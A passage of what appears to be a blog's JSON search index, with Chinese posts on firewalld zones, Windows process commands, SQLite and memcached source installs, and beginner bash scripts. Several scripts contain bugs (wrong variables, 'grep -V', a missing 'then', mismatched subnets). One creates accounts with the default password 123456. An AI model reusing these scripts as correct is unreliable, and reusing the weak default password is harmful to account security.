9F20;&#x6807;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5207;&#x6362;&#x4E86;&#xFF0C;&#x4ECE;&#x800C;&#x6781;&#x5927;&#x63D0;&#x5347;&#x4E86;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7684;&#x5E94;&#x7528;&#x6548;&#x7387;&#x3002; firewalld&#x4E2D;&#x5E38;&#x89C1;&#x7684;&#x533A;&#x57DF;&#x540D;&#x79F0;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A;public&#xFF09;&#x4EE5;&#x53CA;&#x76F8;&#x5E94;&#x7684;&#x7B56;&#x7565;&#x89C4;&#x5219;&#x8868;&#x5982;2&#x6240;&#x793A;&#xFF1A; &#x8868;2. firewalld&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x533A;&#x57DF;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x7B56;&#x7565;&#x89C4;&#x5219; &#x533A;&#x57DF; &#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x7B56;&#x7565; trusted &#x5141;&#x8BB8;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x5165;&#x4E0E;&#x6D41;&#x51FA; home &#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;mdns&#x3001;ipp-client&#x3001;samba-client&#x4E0E;dhcpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF; internal &#x7B49;&#x540C;&#x4E8E;home&#x533A;&#x57DF; work &#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x6570;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;ipp-client&#x4E0E;dhcpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF; public &#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;dchpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Windows进程管理","date":"2022-06-07T04:53:05.000Z","path":"/posts/6ed6984b/","text":"&#x67E5;&#x770B;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x7684;&#x8FDB;&#x7A0B; netstat -ano | findstr &quot;8080&quot; &#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#x8BE6;&#x7EC6;&#x7A0B;&#x5E8F; tasklikst | findstr &quot;PID_NUM&quot; &#x7ED3;&#x675F;&#x8FDB;&#x7A0B; taskkill /T /F /PID pid_num document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"SQLite安装","date":"2022-06-07T04:52:54.000Z","path":"/posts/aa142b64/","text":"&#x4E0B;&#x8F7D;&#x5730;&#x5740;https://www.sqlite.org/download.html &#x6E90;&#x7801;&#x5B89;&#x88C5; 12345tar -zxvf sqlite-autoconf-xxx.tar.gzcd sqlite-autoconf-xxx./configure --prefix=/usr/localmakemake install document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"SHELL脚本练习","date":"2022-06-07T04:52:40.000Z","path":"/posts/8a8ba1e/","text":"Hello World123456#!/bin/bash&lt;!--more--&gt;function example { echo &quot;Hello World&quot;}example &#x7528;&#x6237;&#x731C;&#x6570;&#x5B57; 1234567891011121314151617181920212223#!/bin/bash# &#x811A;&#x672C;&#x751F;&#x6210;&#x4E00;&#x4E2A;100&#x4EE5;&#x5185;&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x5BF9;&#x4E86;&#x3002;# &#x731C;&#x5C0F;&#x4E86;&#x6216;&#x731C;&#x5927;&#x4E86;&#xFF0C;&#x76F4;&#x81F3;&#x7528;&#x6237;&#x731C;&#x5BF9; &#x811A;&#x672C;&#x7ED3;&#x675F;# RANDOM &#x4E3A;&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x7684;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;&#xFF0C;&#x503C;&#x4E3A;0-32767&#x7684;&#x968F;&#x673A;&#x6570;# &#x4F7F;&#x7528;&#x53D6;&#x4F59;&#x7B97;&#x6CD5;&#x5C06;&#x968F;&#x673A;&#x6570;&#x53D8;&#x4E3A;1-100&#x7684;&#x968F;&#x673A;&#x6570;num=$[ RANDOM%100+1 ]echo &quot;$num&quot;# &#x4F7F;&#x7528; read &#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;# &#x4F7F;&#x7528; if &#x5224;&#x65AD;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;&#x7684;&#x5927;&#x5C0F;&#x5173;&#x7CFB;&#xFF1A; # -eq&#xFF08;&#x7B49;&#x4E8E;&#xFF09;, -ne&#xFF08;&#x4E0D;&#x7B49;&#x4E8E;&#xFF09;&#xFF0C;-gt&#xFF08;&#x5927;&#x4E8E;&#xFF09;,-lt&#x5C0F;&#x4E8E;&#xFF0C;-le&#xFF08;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#xFF09;while :do read -p &quot;&#x8BA1;&#x7B97;&#x673A;&#x751F;&#x6210;&#x4E86;&#x4E00;&#x4E2A;1-100&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x4F60;&#x731C;&#xFF1A;&quot; guess if [ $guess -eq $num ] then echo &quot;&#x606D;&#x559C;&#xFF0C;&#x731C;&#x5BF9;&#x4E86;&quot; elif [ $guess -gt $num ] then echo &quot;Oops&#xFF0C;&#x731C;&#x5927;&#x4E86;&quot; else echo &quot;Oops, &#x731C;&#x5C0F;&#x4E86;&quot; fidone &#x526A;&#x5200;&#x77F3;&#x5934;&#x5E03; &#x6E38;&#x620F;12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/bashgame=(&#x526A;&#x5200; &#x77F3;&#x5934; &#x5E03;)num=$[ RANDOM%3 ]computer=${ game[$sum] }echo &quot;&#x8BF7;&#x6839;&#x636E;&#x4E0B;&#x5217;&#x63D0;&#x793A;&#x9009;&#x62E9;&#x60A8;&#x7684;&#x51FA;&#x62F3;&#x624B;&#x52BF;&quot;echo &quot;1. &#x77F3;&#x5934;&quot;echo &quot;2. &#x526A;&#x5200;&quot;echo &quot;3. &#x5E03;&quot;read -p &quot;&#x8BF7;&#x9009;&#x62E9; 1-3:&quot; personcase $person in1) if [ $num -eq 0 ] then echo &quot;&#x5E73;&#x5C40;&quot; elif [ $num -eq 1 ] then echo &quot;&#x4F60;&#x8D62;&#x4E86;&quot; else echo &quot;&#x7535;&#x8111;&#x8D62;&quot; fi;;2) if [ $num -eq 0 ] then echo &quot;&#x7535;&#x8111;&#x8D62;&quot; elif [ $num -eq 1 ] then echo &quot;&#x5E73;&#x5C40;&quot; else echo &quot;&#x4F60;&#x8D62;&#x4E86;&quot; fi;;3) if [ $num -eq 0 ] then echo &quot;&#x4F60;&#x8D62;&quot; elif [ $num -eq 1 ] echo &quot;&#x7535;&#x8111;&#x8D62;&quot; else echo &quot;&#x5E73;&#x5C40;&quot; fi;;*) echo &quot;&#x5FC5;&#x987B;&#x8F93;&#x5165;1-3&#x7684;&#x6570;&#x5B57;&quot;esac &#x4E5D;&#x4E5D;&#x4E58;&#x6CD5;&#x8868;12345678910#!/bin/bashfor i in `seq 9`do for j in `seq $i` do echo -n &quot; $j*$i=$[i*j] &quot; done echodone if&#x8FD0;&#x7B97;&#x8868;&#x8FBE;&#x5F0F;1234567891011#!bin/bashif [ $1 -eq 2 ]; then echo &quot;wo ai wenmin&quot;elif [ $1 -eq 3 ]; then echo &quot;wo ai wenxing&quot;elif [ $1 -eq 4 ]; then echo &quot;wo de xin&quot;elif [ $1 -eq 5 ]; then echo &quot;wo de ai&quot;fi &#x6253;&#x5370;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x68CB;&#x76D8;12345678910111213141516171819202122#!/bin/bash# &#x6253;&#x5370;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x68CB;&#x76D8;# &#x8BBE;&#x7F6E;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;i &#x548C; j&#xFF0C;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x884C;&#xFF0C;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x5217;&#xFF0C;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x4E3A; 8x8&#x68CB;&#x76D8;# i=1 &#x662F;&#x4EE3;&#x8868;&#x51C6;&#x5907;&#x6253;&#x5370;&#x7B2C;&#x4E00;&#x884C;&#x68CB;&#x76D8;&#xFF0C;&#x7B2C;1&#x884C;&#x68CB;&#x76D8;&#x6709;&#x7070;&#x8272;&#x548C;&#x84DD;&#x8272;&#x95F4;&#x9694;&#x8F93;&#x51FA;&#xFF0C;&#x603B;&#x5171;&#x4E3A;8&#x5217;# i=1 &#xFF0C;j=1 &#x4EE3;&#x8868;&#x7B2C;1&#x884C;&#x7684;&#x7B2C;1&#x5217;&#xFF0C;i=2&#xFF0C;j=3&#x4EE3;&#x8868;&#x7B2C;2&#x884C;&#x7684;&#x7B2C;3&#x5217;# &#x68CB;&#x76D8;&#x7684;&#x89C4;&#x5F8B;&#x662F; i+j &#x5982;&#x679C;&#x662F;&#x5076;&#x6570;&#xFF0C;&#x5C31;&#x6253;&#x5370;&#x84DD;&#x8272;&#x8272;&#x5757;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x6280;&#x672F;&#x5C31;&#x6253;&#x5370;&#x7070;&#x8272;&#x8272;&#x5757;# &#x4F7F;&#x7528; echo -ne &#x6253;&#x5370;&#x8272;&#x5757;&#xFF0C;&#x5E76;&#x4E14;&#x6253;&#x5370;&#x5B8C;&#x6210;&#x8272;&#x5757;&#x540E;&#x4E0D;&#x81EA;&#x52A8;&#x6362;&#x884C;&#xFF0C;&#x5728;&#x540C;&#x4E00;&#x884C;&#x7EE7;&#x7EED;&#x8F93;&#x51FA;&#x5176;&#x4ED6;&#x8272;&#x5757;for i in {1..8}do for j in {1..8} do sum=$[ i+j ] if [ $[sum%2] -eq 0 ]; then echo -ne &quot;\\033[46m \\033[0m&quot; else echo -ne &quot;\\033[47m \\033[0m&quot; fi done echodone &#x4F7F;&#x7528;&#x811A;&#x672C;&#x5BF9;&#x8F93;&#x5165;&#x7684;&#x4E09;&#x4E2A;&#x6574;&#x6570;&#x8FDB;&#x884C;&#x6392;&#x5E8F;123456789101112131415161718192021222324252627282930313233#!/bin/bash# &#x4E00;&#x6B21;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;3&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x811A;&#x672C;&#x6839;&#x636E;&#x6570;&#x5B57;&#x5927;&#x5C0F;&#x4F9D;&#x6B21;&#x6392;&#x5E8F;&#x8F93;&#x51FA;3&#x4E2A;&#x6570;&#x5B57;read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot; num1read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot; num2read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot; num3# &#x4E0D;&#x7BA1;&#x8C01;&#x5927;&#x8C01;&#x5C0F;&#xFF0C;&#x6700;&#x540E;&#x90FD;&#x6253;&#x5370; echo &quot;$num1, $num2, $num3&quot;# num1 &#x4E2D;&#x6C38;&#x8FDC;&#x5B58;&#x6700;&#x5C0F;&#x7684;&#x503C;&#xFF0C;num2 &#x4E2D;&#x6C38;&#x8FDC;&#x5B58;&#x4E2D;&#x95F4;&#x503C;&#xFF0C; num3&#x6C38;&#x8FDC;&#x5B58;&#x6700;&#x5927;&#x503C;# &#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x4E0D;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x987A;&#x5E8F;&#xFF0C;&#x5219;&#x6539;&#x53D8;&#x6570;&#x7684;&#x5B58;&#x50A8;&#x4E66;&#x5E8F;&#xFF0C;&#x5982;&#xFF1A;&#x53EF;&#x4EE5;&#x5C06;num1&#x548C;num2&#x7684;&#x503C;&#x5BF9;&#x8C03;tmp=0# &#x5982;&#x679C;num1 &#x5927;&#x4E8E; num2 &#xFF0C;&#x5C31;&#x628A;num1&#x548C;num2&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num1&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;if [ $num1 -gt $num2 ]; then tmp=$num1 num1=$num2 num2=tmpfi# &#x5982;&#x679C;num1&#x5927;&#x4E8E;num3&#xFF0C;&#x5C31;&#x628A;num1&#x548C;num3&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num1&#x7684;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;if [ $num1 -gt $num3 ]; then tmp=$num1 num1=$num3 num3=$tmpfi# &#x5982;&#x679C;num2&#x5927;&#x4E8E;num3&#xFF0C;&#x5C31;&#x628A;num2&#x548C;num3&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num2&#x7684;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;if [ $num2 -gt $num3 ]; then tmp=$num2 num2=$num3 num3=$tmpfiecho &quot;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF08;&#x4ECE;&#x5C0F;&#x5230;&#x5927;&#xFF09;&#x4E3A;&#xFF1A;$num1,$num2,$num3&quot; for&#x5FAA;&#x73AF;&#x5224;&#x65AD;1234567891011121314151617181920212223242526#!/bin/bashs=0;for((i=1;i&lt;100;i++))do s=$[$s+$i]doneecho $sr=0;a=0;b=0;for((x=1; x&lt;9; x++))do a=$[$a+$x] echo $xdonefor ((y=1; y&lt;9; y++))do b=$[$b+$y] echo $ydoneecho $r=$[$a+$b] 1234567891011#!/bin/bashfor i in &quot;$*&quot;do echo &quot;wenmin xihua $i&quot;donefor j in &quot;$@&quot;do echo &quot;wenmin xihuan $j&quot;done &#x4F7F;&#x7528;&#x51FD;&#x6570; &#x6C42;&#x548C;&#x8FD0;&#x7B97;123456789101112131415161718192021222324252627#!/bin/bashfunction sum() { s=0; s=$[$1+$2] echo $s}read -p &quot;input your parameter &quot; p1read -p &quot;input your parameter &quot; p2sum $p1 $p2function multi() { r=0; r=$[$1/$2] echo $r}read -p &quot;input your parameter &quot; x1read -p &quot;input your parameter &quot; x2multi $x1 $x2v1=1v2=2let v3=$v1+$v2echo $v3 case&#x2014;&#x2014;esac&#x5206;&#x652F;&#x7ED3;&#x6784;12345678910111213141516171819202122232425262728#!/bin/bashcase $1 in1) echo &quot;wenmin &quot; ;;2) echo &quot;wenxing &quot; ;;3) echo &quot;wemchang &quot; ;;4) echo &quot;yijun&quot; ;;5) echo &quot;sinian&quot; ;;6) echo &quot;sikeng&quot; ;;7) echo &quot;yanna&quot; ;;*) echo &quot;danlian&quot; ;;esac &#x5BF9;&#x53D8;&#x91CF;&#x7684;&#x4F20;&#x5165;&#x4E0E;&#x83B7;&#x53D6;&#x4E2A;&#x6570;&#x53CA;&#x6253;&#x5370;123456#!/bin/bashecho &quot;$0 $1 $2 $3&quot; //&#x4F20;&#x5165;&#x56DB;&#x4E2A;&#x53C2;&#x6570;echo $# // &#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;&#x6570;&#x91CF;echo $@ //&#x6253;&#x5370;&#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;echo $* //&#x6253;&#x5370;&#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570; &#x811A;&#x672C;&#x5B9A;&#x4E49;while&#x5FAA;&#x73AF;&#x8BED;&#x53E5;123456789101112#!/bin/bashs=0i=1while [ $i -le 100 ]do s=$[$s + $i ] i=$[$i + 1]doneecho $secho $i &#x8BFB;&#x53D6;&#x63A7;&#x5236;&#x53F0;&#x4F20;&#x5165;&#x53C2;&#x6570;12345678910111213#!/bin/bashread -t 7 -p &quot;input your name &quot; NAMEecho $NAMEread -t 11 -p &quot;input you age &quot; AGEecho $AGEread -t 15 -p &quot;input your friend &quot; FRIENDecho $FRIENDread -t 16 -p &quot;input your love &quot; LOVEecho $LOVE &#x6253;&#x5370;&#x5B57;&#x6BCD;&#x6570;&#x5C0F;&#x4E8E;8&#x7684;&#x5355;&#x8BCD; &#x63CF;&#x8FF0;&#x5199;&#x4E00;&#x4E2A;bash&#x811A;&#x672C;&#x4EE5;&#x7EDF;&#x8BA1;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6587;&#x4EF6;nowcoder.txt&#x4E2D;&#x5B57;&#x6BCD;&#x6570;&#x5C0F;&#x4E8E;8&#x7684;&#x5355;&#x8BCD;&#x793A;&#x4F8B;&#xFF1A;&#x5047;&#x8BBE;nowcoder.txt&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;how they are implemented and applied in computer&#x4F60;&#x7684;&#x811A;&#x672C;&#x5E94;&#x5F53;&#x8F93;&#x51FA;&#xFF1A;howtheyareandappliedin&#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x8981;&#x62C5;&#x5FC3;&#x4F60;&#x8F93;&#x51FA;&#x7684;&#x7A7A;&#x683C;&#x4EE5;&#x53CA;&#x6362;&#x884C;&#x7684;&#x95EE;&#x9898; 1awk &apos;BEGIN{FS=&quot;&quot;;RS=&quot; &quot;;ORS=&quot;\\n&quot;}{if(NF&lt;8)print$0}&apos; nowcoder.txt document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"SHELL脚本工具","date":"2022-06-07T04:52:33.000Z","path":"/posts/f42b90f9/","text":"&#x67E5;&#x770B;&#x6709;&#x591A;&#x5C11;&#x8FDC;&#x7A0B;&#x7684;IP&#x5728;&#x8FDE;&#x63A5;&#x672C;&#x673A;123#!/bin/bash&lt;!--more--&gt;netstat -atn | awk &apos;{print $5}&apos; | awk &apos;{print $1}&apos; | sort -nr | uniq -c Get Tomcat PID12345678910#!/bin/bashv1=&quot;Hello&quot;v2=&quot;world&quot;v3=${v1}${v2}echo $v3pidlist=`ps -ef|grep apache-tomcat-7.0.75|grep -v &quot;grep&quot;|awk &apos;{print $2}&apos;`echo $pidlistecho &quot;tomcat id list :$pidlist&quot; # &#x663E;&#x793A;PID &#x6E90;&#x7801;&#x5B89;&#x88C5;memcached1234567891011#!/bin/bash# &#x4E00;&#x952E;&#x90E8;&#x7F72;memcached# &#x811A;&#x672C;&#x7528;&#x6E90;&#x7801;&#x6765;&#x5B89;&#x88C5;memcached&#x670D;&#x52A1;&#x5668;wget http://www.memcached.org/files/memcached-1.5.1.tar.gzyum -y install gcctar -xf memcached-1.5.1.tar.gzcd memcached-1.5.1./configuremake &amp;&amp; make install &#x68C0;&#x6D4B;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;1234567891011#!/bin/bash# &#x68C0;&#x6D4B;&#x672C;&#x673A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x8D85;&#x7EA7;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x5219;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;vsftpd&#xFF0C;# &#x5982;&#x679C;&#x4E0D;&#x662F;&#xFF0C;&#x5219;&#x63D0;&#x793A;&#x60A8;&#x975E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;if [ $USER == &quot;root&quot; ]then yum -y install vsftpdelse echo &quot;&#x60A8;&#x4E0D;&#x662F;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&quot; fi &#x6740;&#x6389;tomcat&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;1234567891011121314151617181920#!/bin/bash# kill tomcat pid# &#x627E;&#x5230;tomcat&#x7684;PIDpidlist=`ps -ef|grep apache-tomcat-7.0.75|grep -V &quot;grep&quot;|awk &apos;{print $2}&apos;`echo &quot;tomcat ID LIST : $pidlist&quot;kill -9 $pidlistecho &quot;KILL $pidlist:&quot;echo &quot;service stop success&quot;echo &quot;start tomcat&quot;cd /opt/apache-tomcat-7.0.75pwdrm -rf work/*cd bin./startup.sh &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x7684;&#x7528;&#x6237;&#x6570;123456789#!/bin/bash# &#x7EDF;&#x8BA1;&#x5F53;&#x524D;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x8D26;&#x6237;&#x6709;&#x591A;&#x5C11;&#x4E2A;# &#x65B9;&#x6CD5;1&#xFF1B;grep &quot;bash$&quot; /etc/passwd | wc -l# &#x65B9;&#x6CD5;2&#xFF1B;awk -f : &apos;/bash$/{x++}end{print x}&apos; /etc/passwd &#x5907;&#x4EFD;MySQL&#x8868;&#x6570;&#x636E;12345678910#!/bin/bashsource /etc/profiledbName=mysqltableName=dbecho [`date+&apos;%Y-%m-%d %H:%M:%S&apos;`]&apos; start loading data....&apos;mysql -uroot -P3306 ${ddbName} -e &quot;LOAD DATA LOCAL INFILE &apos;# /home/wenmin/wenxing.txt&apos; INTO TABLE ${tableName} FIELDS TERMINATED BY &apos;;&apos;&quot;echo [`date +&apos;%Y-%m-%d %H:%M:%S&apos;`]&apos;end loading data...&apos;exit &#x4F7F;&#x7528;&#x6B7B;&#x5FAA;&#x73AF;&#x5B9E;&#x65F6;&#x663E;&#x793A;eth0&#x7F51;&#x5361;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x91CF;12345678910#!/bin/bash# &#x4F7F;&#x7528;&#x6B7B;&#x5FAA;&#x73AF;&#x5B9E;&#x65F6;&#x663E;&#x793A;eth0&#x7F51;&#x5361;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x91CF;while :do echo &apos;&#x672C;&#x5730;&#x7F51;&#x5361; eth0 &#x6D41;&#x91CF;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;&apos; ifconfig eth0 | grep &quot;RX pack&quot; | awk &apos;{print $5}&apos; ifconfig eth0 | grep &quot;TX pack&quot; | awk &apos;{print $5}&apos;done &#x6D4B;&#x8BD5;192.168.4.0/24&#x6574;&#x4E2A;&#x7F51;&#x6BB5;&#x4E2D;&#x54EA;&#x4E9B;&#x4E3B;&#x673A;&#x5904;&#x4E8E;&#x5F00;&#x673A;&#x72B6;&#x6001;&#xFF0C;&#x54EA;&#x4E9B;&#x4E3B;&#x673A;&#x5904;&#x4E8E;&#x5173;&#x673A;&#x72B6;&#x6001;12345678910for i in {1..254}do # &#x6BCF;&#x9694;0.3&#x79D2;ping&#x4E00;&#x6B21;&#xFF0C;&#x4E00;&#x5171;ping2&#x6B21;&#xFF0C;&#x5E76;&#x4EE5;1&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;&#x8BBE;&#x7F6E;ping&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4; ping -c 2 -i 0.3 -W 1 192.168.1.$i $&gt; /dev/null if [ $? -eq 0 ]; then echo &quot;192.168.4.$i is up&quot; else echo &quot;192.168.168.4.$i is down&quot; fidone &#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x914D;&#x7F6E;&#x5BC6;&#x7801;123456789101112131415161718192021222324#!/bin/bash# &#x7F16;&#x5199;&#x811A;&#x672C;&#xFF1A;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x914D;&#x7F6E;&#x5BC6;&#x7801;# &#x5982;&#x679C;&#x7528;&#x6237;&#x4E0D;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#xFF0C;&#x5219;&#x63D0;&#x793A;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#x5E76;&#x9000;&#x51FA;&#x811A;&#x672C;# &#x5982;&#x679C;&#x7528;&#x6237;&#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5219;&#x7EDF;&#x4E00;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x7684;123456&#x4F5C;&#x4E3A;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#xFF1A;&quot; user# &#x4F7F;&#x7528;-z&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x5982;&#x679C;&#x4E3A;&#x7A7A;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#xFF0C;&#x5E76;&#x9000;&#x51FA;&#x811A;&#x672C;&#xFF0C;&#x9000;&#x51FA;&#x7801;&#x4E3A;2# &#x6CA1;&#x6709;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x811A;&#x672C;&#x9000;&#x51FA;&#x540E;&#xFF0C;&#x4F7F;&#x7528;$?&#x67E5;&#x770B;&#x7684;&#x8FD4;&#x56DE;&#x7801;&#x4E3A;2if [ -z $user ]; then echo &quot; &#x60A8;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&quot; exit 2fi# &#x4F7F;&#x7528;stty -echo&#x5173;&#x95ED;shell&#x7684;&#x56DE;&#x663E;&#x529F;&#x80FD;stty -echoread -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF1A;&quot;passstty echopass=${pass:-123456}useradd &quot;$user&quot;echo &quot;$pass&quot; | passwd --stdin &quot;$user&quot; &#x6BCF;&#x5468;5&#x4F7F;&#x7528;tar&#x547D;&#x4EE4;&#x5907;&#x4EFD;/var/log&#x4E0B;&#x7684;&#x6240;&#x6709;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;123456789101112#!/bin/bash# &#x6BCF;&#x5468; 5 &#x4F7F;&#x7528; tar &#x547D;&#x4EE4;&#x5907;&#x4EFD;/var/log 